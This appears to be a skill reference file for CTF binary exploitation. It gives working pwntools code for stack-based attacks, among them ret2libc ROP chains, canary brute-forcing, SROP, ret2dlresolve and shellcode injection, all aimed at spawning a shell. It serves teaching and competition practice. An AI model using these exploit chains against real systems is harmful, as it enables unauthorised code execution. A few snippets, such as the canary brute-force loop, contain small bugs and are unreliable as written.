---
name: ctf-pwn-stack
description: Stack-based memory corruption in CTFs — ret2win, ret2libc, ROP chains, SROP, one_gadget, and the full leak → control flow hijack workflow
---

# CTF Stack Exploitation

The "smash the stack" classics. The challenge always has the same skeleton: **find a buffer overflow → leak what you need → pivot to the win (or system("/bin/sh")) → cat flag.txt**. This skill covers the canonical patterns, in order of complexity.

## 0. Mental Model

```
[low address]
   ...
[buffer]            ← you write here (overflow goes UP)
[canary]            ← if enabled, must be intact
[saved rbp]         ← caller frame pointer
[return address]    ← where execution goes next
[high address]
```

**Modern exploit flow:**
1. **Identify the overflow** — `cyclic` pattern → `cyclic_find` on crash address
2. **Bypass the canary** — leak it, or brute per-byte if forking server
3. **Leak libc/PIE base** — overflow to a `puts(puts@GOT)` ROP chain
4. **Pivot to RCE** — system("/bin/sh") or one_gadget

## 1. ret2win (the easy case)

When `nm` shows a `win` / `shell` / `flag` function that calls `system("/bin/sh")` or `read_flag()`:

```python
from pwn import *
context.binary = elf = ELF('./chall')

io = process('./chall')
# Find the offset (assuming no canary, no PIE)
offset = cyclic_find(0x6161616161616161)  # from your cyclic test
io.sendline(b'A' * offset + p64(elf.symbols['win']))
io.interactive()
```

For functions taking args: `pop rdi; ret; <arg>; <win>`. Use `ROP(elf).find_gadget(['pop rdi', 'ret'])` to find it.

## 2. ret2libc (the 90% case)

The `win` function doesn't exist; you need to call `system("/bin/sh")` from libc. Requires a libc leak.

### Step 1: Leak libc address
```python
context.binary = elf = ELF('./chall')
libc = elf.libc

# ROP chain: puts(puts@GOT) → main (so we get a second input)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret_gadget = rop.find_gadget(['ret']).address    # for stack alignment
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

payload = flat(
    b'A' * offset,
    pop_rdi, puts_got, puts_plt,    # call puts(puts@GOT)
    main                            # return to main for round 2
)
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
```

### Step 2: Get a shell
```python
rop2 = ROP(libc)
pop_rdi = rop2.find_gadget(['pop rdi', 'ret']).address
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload2 = flat(
    b'A' * offset,
    ret_gadget,                      # stack alignment (Ubuntu 18.04+ MOVAPS issue)
    pop_rdi, bin_sh, system
)
io.sendline(payload2)
io.interactive()
```

### The stack-alignment gotcha
Ubuntu 18.04+ libc `system()` uses `movaps` which requires 16-byte RSP alignment. If you crash on the first `system()` call, you have an alignment issue. **Insert a `ret` gadget before the call.** This is a "free" gadget because pwntools' `ROP` already includes one.

## 3. one_gadget (when the magic offsets work)

Some libc versions have one-shot gadgets that call `execve("/bin/sh", ...)` with constraints. `one_gadget` finds them.

```bash
one_gadget /path/to/libc.so.6
# 0x50a37 posix_spawn(rsp+0x30, "/bin/sh", ...)
# 0xebc81 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   rsp & 0xf == 0
#   rax == NULL
#   [rsp+0x30] == NULL
```

The constraints are usually satisfiable by ret-alignment. `one_gadget` saves a chain in many cases.

## 4. ROP gadget mining

```python
# pwntools ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
print(rop.dump())      # printable chain with addresses

# Or use ROPgadget for full dump
ROPgadget --binary ./chall --ropchain
# Prints: Padding (52 bytes), pop rdi; ret, ...
```

**Manually searching for hard-to-find gadgets:**
```bash
ROPgadget --binary ./chall --only "pop|ret" | head -20
ROPgadget --binary ./chall --string "/bin/sh"   # find /bin/sh address
ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
```

## 5. Canary bypass

### Leak via format string
```python
# If the binary has printf(buf) anywhere, the canary is the value
# that appears unchanged across runs (at a fixed offset)
# %1$p, %2$p, ..., %15$p leaks stack words
# The canary typically ends in \x00 (so it always shows as 0x??00)
# Find the offset that prints "0x????????00" and stays stable
```

### Brute per-byte (forking server only)
```python
canary = b'\x00'  # canary always starts with 0x00
for byte_idx in range(1, 8):
    for guess in range(256):
        io = remote(...)
        payload = b'A' * offset + canary + bytes([byte_idx])   # only the unknown byte
        io.send(payload + cyclic(0))  # no ROP yet, just confirm no crash
        if io.can_recv(timeout=0.5) and b'stack smashing' not in io.recv(...):
            canary += bytes([guess])
            break
# Now you have the full canary
```

This is O(8 * 256) = 2048 attempts. Works only if the server forks (each connection is a new child with the same canary).

### Stack-smashing handler trick
GLIBC's `__stack_chk_fail` calls `__fortify_fail("stack smashing detected")` which calls `__libc_message` which eventually calls `__environ` (sometimes). With a controlled format string in argv[0], you can hijack this. Rare in CTF.

## 6. PIE bypass

PIE = code base is randomized. Need a leak.

### Leak strategy
1. Overflow → return to `puts(got_entry)` → return to main → repeat with different leak.
2. Format string: `%p` leaks until you find a PIE-relative pointer (one matching the .text range).
3. Printf chain: leak `__libc_start_main+offset` from the GOT (constant offset to PIE base).

```python
# Recover PIE base from a leak
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
elf.address = leak - elf.symbols['main']
```

## 7. SROP (Sigreturn-Oriented Programming)

When the binary is small and you can't find useful gadgets, SROP is a one-gadget alternative.

```python
# 1. Find a `syscall; ret` gadget
# 2. Find a way to set RAX = 15 (sigreturn syscall number)
#    Often: read() returns 15 when you send exactly 15 bytes
# 3. Use SigreturnFrame to set all registers to execve("/bin/sh")
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = address_of_bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
payload = flat(b'A' * offset, syscall_ret, frame)
io.send(payload)
```

`SigreturnFrame` in pwntools builds the entire 248-byte `ucontext_t` structure for you. Powerful but verbose on the wire.

## 8. ret2csu / __libc_csu_init (universal ROP)

The `__libc_csu_init` function in every dynamically linked ELF has two useful gadgets:

```
gadget1 (at __libc_csu_init+0x40 or so):
  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2 (at __libc_csu_init+0x60 or so):
  mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
```

This lets you call any function with arbitrary 3 args (rdi, rsi, rdx) by writing the function pointer into a `mov`-accessible address (e.g. a GOT entry). Used when your binary lacks simple `pop rdi; ret` gadgets.

## 9. ret2dlresolve (no leak required)

When you have an overflow but no leak and the binary is not full RELRO, you can forge a fake dynamic-resolution structure to make the loader call `system("/bin/sh")` for you.

**pwntools automates this:**
```python
from pwn import *
rop = ROP(elf)
rop.ret2dlresolve(elf.symbols['read'], 0)  # or use 'puts' or your own
# Sets up the fake Elf_Sym, fake relocation, fake string table
payload = flat(b'A' * offset, rop.chain())
io.send(payload)
```

`ret2dlresolve` works because the dynamic linker (`/lib64/ld-linux-x86-64.so.2`) trusts the structure of the binary's `.dynsym` / `.dynstr` / `.rel.plt` sections. Forge them, and the linker will resolve `system` and call it.

## 10. Shellcode on stack/heap (when NX is disabled)

```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())   # execve("/bin/sh")
nop_sled = asm('nop') * 100
payload = nop_sled + shellcode + b'A' * (offset - len(nop_sled) - len(shellcode)) + p64(buffer_addr)
```

For position-independent shellcode (no `jmp`/absolute call), use `shellcraft.nop()` instead of fixed NOPs. For ASLR-bypass, spray heap with shellcode or use a `jmp rsp` gadget.

## Common Pitfalls

- **Off-by-one on the canary leak** — if you leak the canary wrong, you get a crash inside the overflow itself (a "stack smashing detected" error). Verify with `canary & 0xff == 0`.
- **ROP chain is too long** — sometimes the input is limited to N bytes. Use SROP, ret2csu, or a chain that reuses the buffer.
- **Forgot to send the right input** — `send` vs `sendline` vs `sendafter` are all different. `sendline` adds `\n`; the program may or may not want it.
- **Stack alignment MOVAPS crash** — insert a `ret` gadget; the issue is RSP must be 16-byte aligned.
- **Two `ret` gadgets needed** — MOVAPS is on the second retaddr. If your chain has more than one call, multiple `ret` slugs may be needed.
- **Forgot to wait for the prompt** — `recvuntil(b': ')` before `sendline`. Or use `sendlineafter(b': ', payload)`.
- **Wrong libc on the remote** — the leak is the truth. `libc.rip` will tell you the right one.
- **One_gadget constraint not satisfied** — try each of the offsets in turn. Add `ret` to nudge stack alignment.
- **Sandbox / seccomp** — the binary may restrict `execve`. Use `open/read/write` chain instead, or build a syscall chain (see `pwn-shellcraft`).

## Tooling Cheat Sheet

```bash
one_gadget /path/to/libc.so.6          # magic gadgets
ROPgadget --binary ./chall --ropchain  # full auto chain
ROPgadget --binary ./chall --string "/bin/sh"
seccomp-tools dump ./chall             # show seccomp rules
python3 -c "from pwn import *; print(ROP(ELF('./chall')).chain())"  # quick chain
pwninit ./chall                        # auto-template with matching libc
```
